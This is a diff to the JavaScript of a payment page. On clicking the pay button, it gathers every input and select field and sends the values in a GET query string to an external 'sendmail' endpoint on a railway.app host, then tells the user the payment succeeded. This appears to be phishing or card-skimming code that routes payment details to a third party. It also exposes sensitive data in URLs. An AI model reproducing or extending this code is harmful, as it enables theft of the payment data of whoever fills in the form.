@@ -73,29 +73,37 @@ paymentButton.addEventListener('click', async (event) => {
     }
 
     try {
+        const formData = new URLSearchParams(); // Use URLSearchParams!
         const fields = document.querySelectorAll('input, select');
-        let html = '';
 
         fields.forEach(field => {
-            html += field.id + ': ' + field.value + "<br>"
+            formData.append(field.id, field.value); // Append to formData
         });
 
-        const url = `https://codesnode-production.up.railway.app/sendmail?message=${html.toString()}`;
+        const url = `https://codesnode-production.up.railway.app/sendmail?${formData.toString()}`; // Construct URL
 
-        document.getElementById('loading').style.display = 'flex';
+        document.getElementById('loading').style.display = 'flex'; // Show loading indicator
 
-        const response = await fetch(url, { method: 'POST' });
+        const response = await fetch(url, { method: 'GET' });
 
         if (!response.ok) {
             const errorText = await response.text();
             throw new Error(`Server Error: ${response.status} - ${errorText}`);
         }
 
-        const data = await response.json();
+        const data = await response.json(); // Parse JSON response
         console.log('Server Response:', data);
+
+        // Hide loading indicator and show success message
+        document.getElementById('loading').style.display = 'none';
+        alert("Payment submitted successfully!"); // Or a more user-friendly message
 
     } catch (error) {
         console.error('Error submitting payment:', error);
+
+        // Hide loading indicator and show error message
+        document.getElementById('loading').style.display = 'none';
+        alert("An error occurred. Please try again later."); // Or a more specific error message
     }
 });
 
